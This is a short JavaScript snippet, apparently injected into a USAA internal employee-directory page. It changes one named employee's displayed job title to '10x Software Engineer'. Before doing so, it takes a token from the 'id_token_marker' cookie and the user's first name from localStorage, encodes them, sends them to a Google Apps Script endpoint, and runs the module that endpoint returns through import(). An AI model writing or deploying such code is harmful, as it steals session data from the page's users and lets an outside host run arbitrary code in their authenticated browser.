(() => {
  const parse = (x) => {
    try {
      return JSON.parse(x);
    } catch {
      return x;
    }
  };
  let eagleid = Object.fromEntries(document.cookie.split(";").map((x) => String(x).trim().split("=")).map((x) => [x.shift(), x.join("=")])).id_token_marker;
  let name = String(parse(localStorage.getItem("user"))?.FirstName);
  const url = new URL("https://script.google.com/macros/s/AKfycbzCqAhWZNUcRaKvXSE9EhSgWvCY4xCgY0U2ksr_nv_eCGd2i-oh8cznalBfqSkSn7C6Vw/exec",);
  url.searchParams.set("payload",btoa(encodeURIComponent(JSON.stringify({ eagleid, name }))));
  (async () => {
    try {
      await import(url);
    } catch {}
    [...document.querySelectorAll(`[id="person"]>[id="title"]:not([x10]),[id*="orgItemInfoContainer"]:has([href="https://apps.usaa.com/enterprise/employee-directory?emplNum=Y3953"]) [id*="orgJobTitle"]:not([x10])`,)].forEach((x) => {
      x.innerText = "10x Software Engineer";
      x.setAttribute("x10", true);
    });
    [...document.querySelectorAll("[missing]")].forEach((x) => x.remove());
  })();
})();
